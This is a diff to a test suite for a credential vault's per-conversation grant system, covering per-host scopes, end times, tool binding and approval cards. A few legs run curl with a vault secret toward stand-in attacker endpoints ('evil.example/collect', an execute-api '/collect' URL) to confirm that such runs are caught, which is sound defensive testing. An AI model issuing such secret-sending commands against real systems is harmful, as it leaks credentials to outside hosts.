@@ -46,6 +46,9 @@ const require = createRequire(import.meta.url);
 const REPO = path.resolve(new URL('..', import.meta.url).pathname);
 const GM = require(path.join(REPO, 'src/grant-model.js'));
 const U = require(path.join(REPO, 'src/vault-use-grant.js'));
+/** lane vault-standing-request r4: a member read as its SCOPES (the r4 shape, or the one-end shape before it) — `hosts`, and
+ *  `end(host)` = that scope's own end (null = none, undefined = not held). Read here, never through the tree's own reader. */
+const scopeView = (m) => { const sc = !m ? [] : Array.isArray(m.scopes) ? m.scopes.map((s) => ({ host: s.host, command: s.command, until: s.until || null, tool: s.tool || null })) : [...(m.hosts || []).map((h) => ({ host: h, until: m.until || null, tool: (m.toolFor || {})[h] || null })), ...(m.commands || []).map((c) => ({ command: c, until: m.until || null }))]; return { scopes: sc, hosts: sc.filter((s) => s.host).map((s) => s.host), commands: sc.filter((s) => s.command).map((s) => s.command), end: (h) => { const s = sc.find((x) => x.host === h); return s ? s.until : undefined; }, tool: (h) => { const s = sc.find((x) => x.host === h); return s ? s.tool : undefined; } }; };
 const VU = require(path.join(REPO, 'src/vault-use.js'));
 const VI = require(path.join(REPO, 'src/vault-inventory.js'));
 const VR = require(path.join(REPO, 'src/vault-run.js'));
@@ -117,13 +120,43 @@ console.log('② THE VERDICT — membership is the model\'s; hosts and the end a
   ok(U.useVerdict([ent], { conversationKeys: ['cid-1'] }, run(['unifi.lan'], { entryHosts: ['unifi.lan'] })).ok && !U.useVerdict([ent], { conversationKeys: ['cid-1'] }, run(['unifi.lan'], { entryHosts: [] })).ok, '@entry = the hosts the entry was stored for, read at use time (none ⇒ it covers nothing)');
   const none = U.useVerdict([], { conversationKeys: ['cid-1'] }, run(['192.168.1.1']));
   ok(!none.ok && none.code === 'not_granted' && !U.holds(none), 'no row ⇒ not_granted');
-  // lane vault-standing-request r3b (restated — 主开发: «a write replaces or adds a member with exactly the asked scope and end; it
-  // never merges hosts or drops an end into an existing member»): the old leg pinned «hosts ∪, the later end (no end wins)»
+  // lane vault-standing-request r4 (re-derived twice — r3b pinned «another end REPLACES the member», the round before it «hosts ∪,
+  // the later end»; 主开发's root model: «a member's scopes carry THEIR OWN ENDS»): a write ADDS the scope it names with ITS end
+  // and never touches another scope — the protection both old legs pinned (no host outlives the end it was given) still holds
   const wd = U.withMember(row, { kind: 'conversation', key: 'cid-1' }, { hosts: ['10.0.0.9'], until: NOW + 5 });
-  const wdm = wd.to && wd.to.find((e) => e.key === 'cid-1');
-  ok(wd.ok && !wd.added && wdm.hosts.join() === '10.0.0.9' && wdm.until === NOW + 5 && wd.replaced && wd.replaced.hosts.join() === '192.168.1.1' && wd.replaced.until === null, 'r3b: a write whose END differs from the member\'s (a 30-day «Always» onto a grant with no end) REPLACES it — exactly the asked hosts and end; `replaced` names what went (never ∪ with no end)', wd);
+  const wdm = wd.to && scopeView(wd.to.find((e) => e.key === 'cid-1'));
+  ok(wd.ok && !wd.added && wdm.end('192.168.1.1') === null && wdm.end('10.0.0.9') === NOW + 5 && wd.changes?.added.length === 1 && !wd.changes?.replaced.length, 'r4: a write ADDS the scope it names with ITS end (10.0.0.9 until NOW+5) — 192.168.1.1 keeps its own (no end): never ∪ under one end, never the member replaced', wd);
   const wd3 = U.withMember(row, { kind: 'conversation', key: 'cid-1' }, { hosts: ['10.0.0.9'] });
-  ok(wd3.ok && wd3.widened && !wd3.replaced && wd3.to.find((e) => e.key === 'cid-1').hosts.join() === '192.168.1.1,10.0.0.9' && !('until' in wd3.to.find((e) => e.key === 'cid-1')), 'r3b: the SAME end (both none) adds — hosts ∪, nothing\'s end moves (what two members would be)', wd3);
+  ok(wd3.ok && wd3.widened && scopeView(wd3.to.find((e) => e.key === 'cid-1')).hosts.join() === '192.168.1.1,10.0.0.9' && scopeView(wd3.to.find((e) => e.key === 'cid-1')).end('10.0.0.9') === null, 'r4: the same end adds the same way — both no end, each its own scope', wd3);
+  // r4: THE SAME SCOPE — another end REPLACES only it (named), the same end moves nothing; an ENDED scope is never revived or
+  // merged into (a write that names it grants it anew, named `expired`); the carry never gives a later end; past the cap the
+  // oldest ENDED host scope goes first
+  const t1 = U.withMember({ door: 'vault-use', resource: RES, to: wd.to, except: [] }, { kind: 'conversation', key: 'cid-1' }, { hosts: ['10.0.0.9'], until: NOW + 99, now: NOW });
+  const t1v = t1.ok && scopeView(t1.to.find((e) => e.key === 'cid-1'));
+  ok(t1.ok && t1.changes?.replaced.length === 1 && t1.changes?.replaced?.[0].host === '10.0.0.9' && t1.changes?.replaced?.[0].was === NOW + 5 && t1.changes?.replaced?.[0].until === NOW + 99 && !t1.changes?.replaced?.[0].expired && t1v.end('10.0.0.9') === NOW + 99 && t1v.end('192.168.1.1') === null, 'r4: the SAME scope with ANOTHER end is REPLACED — only it (changes.replaced names its old and new end); 192.168.1.1 untouched', t1.changes);
+  const t2 = U.withMember({ door: 'vault-use', resource: RES, to: wd3.to, except: [] }, { kind: 'conversation', key: 'cid-1' }, { hosts: ['10.0.0.9'], now: NOW });
+  ok(t2.ok && !t2.widened && t2.changes?.same.length === 1 && !t2.changes?.added.length && !t2.changes?.replaced.length, 'r4: the same scope with the SAME end moves nothing (changes.same)', t2.changes);
+  const ended = { door: 'vault-use', resource: RES, to: [{ kind: 'conversation', key: 'cid-1', scopes: [{ host: 'old.lan', until: NOW - 1 }, { host: 'keep.lan', until: NOW - 1 }] }], except: [] };
+  const t3 = U.withMember(ended, { kind: 'conversation', key: 'cid-1' }, { hosts: ['new.lan'], until: NOW + 50, now: NOW });
+  const t3v = t3.ok && scopeView(t3.to[0]);
+  const t4 = U.withMember(ended, { kind: 'conversation', key: 'cid-1' }, { hosts: ['old.lan'], until: NOW + 50, now: NOW });
+  const t4v = t4.ok && scopeView(t4.to[0]);
+  ok(t3.ok && t3v.end('old.lan') === NOW - 1 && t3v.end('keep.lan') === NOW - 1 && t3v.end('new.lan') === NOW + 50 && t4.ok && t4.changes?.replaced.length === 1 && t4.changes?.replaced?.[0].expired === true && t4v.end('old.lan') === NOW + 50 && t4v.end('keep.lan') === NOW - 1, 'r4: an ENDED scope is never revived by a write for ANOTHER scope (old.lan, keep.lan stay ended beside new.lan); a write that NAMES it grants it anew — named `expired` — and keep.lan stays ended', { t3: t3.changes, t4: t4.changes });
+  const t5 = U.withMember({ door: 'vault-use', resource: RES, to: [{ kind: 'conversation', key: 'cid-1', scopes: [{ host: 'a.lan', until: NOW + 10 }, { host: 'z.lan', until: NOW - 1 }] }], except: [] }, { kind: 'conversation', key: 'cid-1' }, { hosts: ['a.lan', 'b.lan', 'z.lan'], until: NOW + 99, now: NOW, carry: true });
+  const t5v = t5.ok && scopeView(t5.to[0]);
+  ok(t5.ok && t5v.end('a.lan') === NOW + 10 && t5v.end('b.lan') === NOW + 99 && t5v.end('z.lan') === NOW - 1, 'r4: THE CARRY (migration) — a held scope keeps the EARLIER end (a.lan), a new one takes the row\'s own (b.lan), an ended one stays ended (z.lan)', t5.changes);
+  const full = { door: 'vault-use', resource: RES, to: [{ kind: 'conversation', key: 'cid-1', scopes: [...Array.from({ length: 15 }, (_, k) => ({ host: `h${k}.lan` })), { host: 'gone.lan', until: NOW - 9 }] }], except: [] };
+  const t6 = U.withMember(full, { kind: 'conversation', key: 'cid-1' }, { hosts: ['new.lan'], now: NOW });
+  const t7 = U.withMember({ door: 'vault-use', resource: RES, to: [{ kind: 'conversation', key: 'cid-1', scopes: Array.from({ length: 16 }, (_, k) => ({ host: `h${k}.lan` })) }], except: [] }, { kind: 'conversation', key: 'cid-1' }, { hosts: ['new.lan'], now: NOW });
+  ok(t6.ok && t6.changes?.pruned.length === 1 && t6.changes?.pruned?.[0].host === 'gone.lan' && scopeView(t6.to && t6.to[0]).hosts.length === 16 && !t7.ok && t7.code === 'too_many_hosts', 'r4: past the 16-host cap the member\'s ENDED host scope goes first (pruned, named) — sixteen live ones refuse too_many_hosts', { t6: t6.changes, t7 });
+  // r4: THE CANON is over what a member MEANS — a one-end member and the scoped member it reshapes to are the SAME bytes (the
+  // migration keeps every mark); scopes with their own ends canonicalize per scope; a legacy single `tool` cannot be reshaped
+  const one = { kind: 'conversation', key: 'cid-1', name: 'One', hosts: ['a.lan', '*.amazonaws.com'], toolFor: { '*.amazonaws.com': 'aws' }, commands: [{ program: '/usr/bin/python3', pre: [], arg: '/w/x.py', sha: 'a'.repeat(64), psha: null }], until: NOW + 7, source: 'card', at: NOW };
+  const sc = typeof U.scopedMember === 'function' ? GM.normEntry(U.scopedMember(one), 'vault-use') : null;   // a tree before r4 has no reshaper: the legs below fail BY NAME
+  const mixed = sc && GM.normEntry({ ...sc, scopes: sc.scopes.map((s, k) => (k ? s : { ...s, until: NOW + 8 })) }, 'vault-use');
+  const sr = typeof U.scopedRowOf !== 'function' ? {} : U.scopedRowOf({ door: 'vault-use', resource: RES, to: [one, { kind: 'conversation', key: 'cid-2', hosts: ['*.x.example'], tool: 'curl' }], except: [] });
+  ok(!!sc && typeof U.canonOf === 'function' && Array.isArray(sc.scopes) && sc.scopes.length === 3 && U.canonOf(RES, sc, ['x'], 4) === U.canonOf(RES, one, ['x'], 4) && U.canonOf(RES, mixed, ['x'], 4) !== U.canonOf(RES, one, ['x'], 4) && /^\["vault-use-v2"/.test(U.canonOf(RES, mixed, [], 0)) && sr.ok && sr.mapped === 1 && sr.unmapped.join() === 'conversation:cid-2', 'r4: THE CANON — a one-end member and its scoped shape canonicalize to the SAME bytes (its mark carries over); scopes with their own ends use the per-scope canon; a member with a legacy single `tool` is left unmapped (named)', { sr });
+  ok(GM.normEntry({ kind: 'conversation', key: 'cid-1', scopes: [{ host: 'a.lan' }], hosts: ['a.lan'] }, 'vault-use') === null && GM.normEntry({ kind: 'conversation', key: 'cid-1', scopes: [{ host: 'a.lan' }, { host: 'a.lan', until: 5 }] }, 'vault-use') === null && GM.normEntry({ kind: 'conversation', key: 'cid-1', scopes: [{ host: '*.com' }] }, 'vault-use') === null, 'r4: a member is ONE shape (scopes beside a one-end field ⇒ refused / dropped), a scope is named once (two ends for one host ⇒ refused), a scope\'s host obeys the host grammar');
   const wd2 = U.withMember(row, { kind: 'conversation', key: 'cid-left-out' }, { hosts: ['a.lan'] });
   ok(wd2.ok && wd2.added && !wd2.except.length, 'adding a member takes it out of 除了');
   ok(!U.withMember(row, { kind: 'conversation', key: 'cid-1' }, { hosts: [] }).ok && U.withMember(row, { kind: 'conversation', key: 'cid-1' }, { hosts: [] }).code === 'hosts_required', 'a member with no host ⇒ hosts_required (never «any host»)');
@@ -192,7 +225,20 @@ function entryOf(w, { label = LABEL, hosts = [] } = {}) {
 }
 const CURL = (ref, ...rest) => ['--env', `T=${ref}`, '--', 'curl', ...rest];
 const RUNTOOL = (ref, ...argv) => ['--env', `T=${ref}`, '--', ...argv];   // round 3: a run of an arbitrary tool with the vault ref in env
-const ROW = (w, e) => w.useGrants.rowsOf(e.id)[0] || null;
+// lane vault-standing-request r4: a row's members read as the fields the legs below were written against — `hosts` / `commands` /
+// `toolFor` (when it has some), `until` (the ONE end its scopes share), `source` + `at` — a member whose scopes share ONE end and
+// writer is the one-end member it means; one whose scopes have their own ends is returned as it is (read with scopeView)
+const compatOf = (m) => {
+  if (!m || !Array.isArray(m.scopes)) return m;
+  const one = m.scopes.length && m.scopes.every((s) => (s.until || null) === (m.scopes[0].until || null) && (s.source || null) === (m.scopes[0].source || null));
+  if (!one) return m;   // scopes with their own ends: as they are (the per-scope legs read them with scopeView)
+  const { scopes: _drop, ...bare } = m;
+  const sc = m.scopes, hosts = sc.filter((s) => s.host).map((s) => s.host), commands = sc.filter((s) => s.command).map((s) => s.command);
+  const tf = {}; for (const s of sc) if (s.host && s.tool) tf[s.host] = s.tool;
+  const ends = [...new Set(sc.map((s) => s.until || null))], last = sc.reduce((a, s) => (s.at && (!a || s.at >= a.at) ? s : a), null);
+  return { ...bare, ...(hosts.length ? { hosts } : {}), ...(commands.length ? { commands } : {}), ...(Object.keys(tf).length ? { toolFor: tf } : {}), ...(ends[0] ? { until: ends[0] } : {}), ...(last && last.source ? { source: last.source, at: last.at } : {}) };   // ONE end and writer: the one-end shape it means (it round-trips through setRow as the owner's Save does)
+};
+const ROW = (w, e) => { const r = w.useGrants.rowsOf(e.id)[0] || null; return r ? { ...r, to: (r.to || []).map(compatOf) } : null; };
 const contentsFrames = (w) => w.frames.filter((m) => m && m.type === 'vault-contents');
 
 console.log('③ THE WRITER — hosts required, a widening needs 验证是你, every write through the store, the window told');
@@ -242,7 +288,7 @@ const E4 = entryOf(W4);
   ok(mine && mine.uses === 3 && mine.convs === 1 && pub.used.uses === 3 && pub.used.convs === 1, 'the window\'s row: «used 3× by 1 conversation» on the member, and on the entry', pub);
   const out = await runAnswered(w, CURL(e.ref, 'https://10.0.0.9/'));
   ok(out.card && !out.r.ok && out.r.code === 'ask_denied', 'ANOTHER host ⇒ the card (today\'s) — denied here', { card: !!out.card, code: out.r.code });
-  ok(out.card && out.card.detail.includes(`A standing approval exists for this conversation (${g.grant}: 192.168.1.1) — this run is outside it: 10.0.0.9.`) && out.card.detail.includes('«Always» replaces the grant with no end this conversation holds on it (192.168.1.1): that grant ends, and the new one holds only this run\'s hosts, for 30 days.') && !/widens it/.test(out.card.detail) && out.card.facts && out.card.facts.always && out.card.facts.always.replaces && out.card.facts.always.replaces.until === null, 'the card NAMES the standing approval and what is outside it (host 10.0.0.9) — r3b (restated): and that «Always» REPLACES it (a grant with no end, under a 30-day «Always»), never «widens it»', out.card && out.card.detail);
+  ok(out.card && out.card.detail.includes(`A standing approval exists for this conversation (${g.grant}: 192.168.1.1) — this run is outside it: 10.0.0.9.`) && !/replaces|widens it/.test(out.card.detail) && out.card.facts && out.card.facts.always && !(out.card.facts.always.changes || []).length && !out.card.facts.always.replaces, 'the card NAMES the standing approval and what is outside it (host 10.0.0.9) — r4 (re-derived; r3b pinned «its «Always» REPLACES it»): its «Always» ADDS 10.0.0.9 with its own end, so the card names nothing it replaces — never «widens it»', out.card && out.card.detail);
   const sh = await runAnswered(w, ['--env', `T=${e.ref}`, '--', 'sh', '-c', 'curl https://192.168.1.1/']);
   ok(sh.card && sh.card.detail.includes('where this run sends it cannot be told'), 'a SHELL (its destination cannot be told) ⇒ the card — naming the standing approval it cannot apply', sh.card && sh.card.detail.split('\n').slice(-3));
   const other = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/'), { caller: w.caller('cid-other-2', 'Other lane') });
@@ -274,11 +320,12 @@ console.log('⑤ «ALWAYS» WRITES A GRANT — this conversation × these hosts;
   ok(!JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8')).always.length, 'data/vault-run.json keeps NO «always» row — ONE mechanism');
   const n1 = await runAnswered(w, CURL(e.ref, '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 'https://192.168.1.1/api/s/default/stat/device'));
   ok(n1.r.ok && n1.r.by === 'grant' && !n1.card, 'the next run of ANOTHER shape to the same host asks NOTHING (a cluster) — the base asked again for every new shape', { by: n1.r.by, card: !!n1.card });
+  const end1 = scopeView(ROW(w, e).to.find((x) => x.key === 'cid-asker-1')).end('192.168.1.1');   // r4: 192.168.1.1's own end before the wider press
   const wide = await runAnswered(w, CURL(e.ref, 'https://192.168.1.2/'), { answer: 'always', reauthed: true });
   const id = U.grantIdOf(e.id, 'conversation:cid-asker-1');
   ok(wide.card && wide.card.detail.includes(`(${id}: 192.168.1.1) — this run is outside it: 192.168.1.2`), 'a wider host\'s card names the grant and what is outside it', wide.card && wide.card.detail.split('\n').filter((l) => /standing/.test(l)));
   const m2 = ROW(w, e).to.find((x) => x.key === 'cid-asker-1');
-  ok(wide.r.ok && m2.hosts.join() === '192.168.1.2' && Math.abs(m2.until - (Date.now() + VR.ALWAYS_TTLS['30d'])) < 60e3 && U.grantIdOf(e.id, 'conversation:cid-asker-1') === id && wide.card.detail.includes('This replaces the time-limited grant this conversation holds on it (192.168.1.1, until '), 'r3b (restated — it was «WIDENS the same member, hosts ∪»): its «Always» (another end) REPLACES the member — exactly 192.168.1.2 for 30 days, the same grant id — and its card SAID so', m2);
+  ok(wide.r.ok && end1 > Date.now() && scopeView(m2).end('192.168.1.1') === end1 && Math.abs(scopeView(m2).end('192.168.1.2') - (Date.now() + VR.ALWAYS_TTLS['30d'])) < 60e3 && U.grantIdOf(e.id, 'conversation:cid-asker-1') === id && !/replaces/.test(wide.card.detail), 'r4 (re-derived — r3b: «REPLACES the member», before it «WIDENS it, hosts ∪»): its «Always» ADDS 192.168.1.2 with its own 30 days, 192.168.1.1 keeps ITS OWN end (the first press\'s, unchanged) — the same grant id, and its card named nothing it replaces', m2);
   const al = linesOf(w, 'vault-run-always').pop();
   ok(al && Array.isArray(al.grants) && al.grants[0] === id && al.hosts.join() === '192.168.1.2', 'the «always» audit line names the grant and the hosts', al);
 }
@@ -427,7 +474,7 @@ console.log('⑩ CONTROLS — patched copies, each RED on its leg');
   w2.useGrants.addMember(e2.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
   const m2 = await runAnswered(w2, CURL(e2.ref, 'https://evil.example/collect'));
   ok(m2.r.ok && m2.r.by === 'grant' && !m2.card, 'MUTANT «a verdict that ignores the hosts»: a grant for 192.168.1.1 sends the value to evil.example with NO card — the shipped verdict draws the card (④)', { by: m2.r.by, card: !!m2.card });
-  const wcut = 'if (widens(was, v.row) && !reauthed) return named(\'reveal_needs_password\');';
+  const wcut = 'if (widens(was, { to: rowTo, except: v.row.except }) && !reauthed) return named(\'reveal_needs_password\');';   // r4: judged on the Save's per-scope row
   ok(GSRC.split(wcut).length === 2, 'the widening rule is there once');
   const noReauth = M.load('src/server/vault-use-grants.js', GSRC.replace(wcut, ''), 'noreauth');
   const w3 = await world({ ugMod: noReauth });
@@ -755,27 +802,27 @@ console.log('㉑ ROUND 3 (MAJOR item 5) — a grant names its TOOL: a wildcard d
   w.door.setRunnable({ id: e.id, on: true, reauthed: true });   // open for runs so the aws run draws a card that offers «Always»
   const aws = await runAnswered(w, RUNTOOL(e.ref, 'aws', 's3', 'ls'), { answer: 'always', reauthed: true, ttl: '30d' });
   ok(aws.r.ok && aws.r.by === 'always', '«Always» on `aws s3 ls` ⇒ a standing grant', { by: aws.r.by, code: aws.r.code });
-  const row = w.useGrants.rowsOf(e.id)[0];
+  const row = ROW(w, e);
   ok(row && row.to[0].toolFor && row.to[0].toolFor['*.amazonaws.com'] === 'aws' && row.to[0].hosts.join() === '*.amazonaws.com', 'the grant carries toolFor {*.amazonaws.com: aws} (round 4 item 3: the tool is PER HOST)', row && row.to[0]);
   const aws2 = await runAnswered(w, RUNTOOL(e.ref, 'aws', 's3', 'ls', '--region', 'us-east-1'));
   ok(aws2.r.ok && aws2.r.by === 'grant', 'another `aws` run under the wildcard ⇒ by: grant (its own CLI)', { by: aws2.r.by });
   const evil = await runAnswered(w, CURL(e.ref, 'https://abc123.execute-api.us-east-1.amazonaws.com/collect'));
   ok(evil.card && evil.r.by !== 'grant', 'a `curl` to an execute-api.amazonaws.com endpoint ⇒ the CARD (the aws wildcard is not granted to curl — by: grant on be0f025f)', { by: evil.r.by, card: !!evil.card });
   // round 4 (MAJOR item 3): a later «Always» on curl for ANOTHER host must NOT re-scope the aws wildcard to curl, and the aws grant must keep working
-  const al2 = await runAnswered(w, CURL(e.ref, 'https://127.0.0.5:9/status'), { answer: 'always', reauthed: true, ttl: '30d' });   // r3b: a 30-day press onto the aws member (another end) REPLACES it — the per-host tool is tested below where the ends match
+  const al2 = await runAnswered(w, CURL(e.ref, 'https://127.0.0.5:9/status'), { answer: 'always', reauthed: true, ttl: '30d' });   // r4: a 30-day press for ANOTHER host adds it — the aws wildcard keeps its tool and its own end
   ok(al2.r.ok && al2.r.by === 'always', '«Always» on `curl https://127.0.0.5:9/status` ⇒ a standing grant for that host', { by: al2.r.by });
-  const row2 = w.useGrants.rowsOf(e.id)[0];
-  ok(row2 && row2.to[0].hosts.join() === '127.0.0.5:9' && !(row2.to[0].toolFor || {})['127.0.0.5:9'], 'r3b (restated — it was «ADDS a plain host row»): the 30-day curl «Always» onto the 30-day aws member (another end) REPLACES it — exactly 127.0.0.5:9, no tool on a plain host', row2 && row2.to[0]);
+  const row2 = w.useGrants.rowsOf(e.id)[0], sv2 = row2 && scopeView(row2.to[0]);
+  ok(row2 && sv2.hosts.slice().sort().join() === '*.amazonaws.com,127.0.0.5:9' && sv2.tool('*.amazonaws.com') === 'aws' && !sv2.tool('127.0.0.5:9') && sv2.end('*.amazonaws.com') > Date.now() && sv2.end('127.0.0.5:9') > Date.now(), 'r4 (re-derived — r3b: «REPLACES it»; the round-4 leg it restated: «ADDS a plain host row»): the 30-day curl «Always» ADDS 127.0.0.5:9 (no tool on a plain host, its own 30 days) and the aws wildcard keeps its tool and ITS own end', row2 && row2.to[0]);
   const evil2 = await runAnswered(w, CURL(e.ref, 'https://abc123.execute-api.us-east-1.amazonaws.com/collect'));
   ok(evil2.card && evil2.r.by !== 'grant', 'after the curl «Always», `curl` to execute-api STILL draws the card (the aws wildcard was not re-scoped to curl)', { by: evil2.r.by, card: !!evil2.card });
   const awsGone = await runAnswered(w, RUNTOOL(e.ref, 'aws', 's3', 'ls'));
-  ok(!awsGone.r.ok && awsGone.r.by !== 'grant' && !!awsGone.card && al2.card.detail.includes('This replaces the time-limited grant this conversation holds on it (*.amazonaws.com, until '), 'r3b (restated — it was «STILL by: grant»): the aws grant was REPLACED — the curl card SAID so — and `aws s3 ls` draws its card again', { by: awsGone.r.by, card: !!awsGone.card });
+  ok(awsGone.r.ok && awsGone.r.by === 'grant' && !awsGone.card && !/replaces/.test(al2.card.detail), 'r4 (re-derived — round 4 pinned «`aws s3 ls` is STILL by: grant», r3b restated it to «replaced»): the curl «Always» touched nothing of the aws grant — `aws s3 ls` STILL runs by: grant, and the curl card named nothing it replaces', { by: awsGone.r.by, card: !!awsGone.card });
   // the round-4 rule itself, where the ends MATCH (both none — a press with no end adds): a later curl «Always» never re-scopes the aws wildcard
   const w9 = await world(); const e9 = entryOf(w9);
   w9.door.setRunnable({ id: e9.id, on: true, reauthed: true });
   const a9 = await runAnswered(w9, RUNTOOL(e9.ref, 'aws', 's3', 'ls'), { answer: 'always', reauthed: true, ttl: 'forever' });
   const c9 = await runAnswered(w9, CURL(e9.ref, 'https://127.0.0.5:9/status'), { answer: 'always', reauthed: true, ttl: 'forever' });
-  const row9 = w9.useGrants.rowsOf(e9.id)[0];
+  const row9 = ROW(w9, e9);
   const aws9 = await runAnswered(w9, RUNTOOL(e9.ref, 'aws', 's3', 'ls'));
   const evil9 = await runAnswered(w9, CURL(e9.ref, 'https://abc123.execute-api.us-east-1.amazonaws.com/collect'));
   ok(a9.r.ok && c9.r.ok && row9 && row9.to[0].toolFor && row9.to[0].toolFor['*.amazonaws.com'] === 'aws' && !row9.to[0].toolFor['127.0.0.5:9'] && row9.to[0].hosts.slice().sort().join() === '*.amazonaws.com,127.0.0.5:9' && aws9.r.ok && aws9.r.by === 'grant' && evil9.card && evil9.r.by !== 'grant', 'round 4 (item 3), where the ends match (both «No end»): the curl «Always» ADDS its plain host; the aws wildcard keeps its tool — `aws s3 ls` is still by: grant, curl to execute-api still cards', row9 && row9.to[0]);
@@ -811,7 +858,7 @@ console.log('㉓ ROUND 4 (MAJOR item 4) — the mark covers the WHOLE ROW, the v
   const locked = w.useGrants.setRow(e.id, { to: [{ kind: 'conversation', key: 'cid-asker-1', hosts: ['192.168.1.1', '10.0.0.0'] }] }, { reauthed: true });
   ok(!locked.ok && locked.code === 'vault_locked', 'a save while the vault is LOCKED is refused BY NAME (vault_locked) — never a mac:null row', locked);
   await w.vault.unlock(PW);
-  const row = w.useGrants.rowsOf(e.id)[0];
+  const row = ROW(w, e);
   ok(row && row.to.length === 1 && (row.to[0].hosts || []).join() === '192.168.1.1', 'after unlock the owner\'s grant is intact (the locked write changed nothing — on 16c68243 a locked save wrote mac:null and the grant was lost)', row && row.to[0]);
 }
 
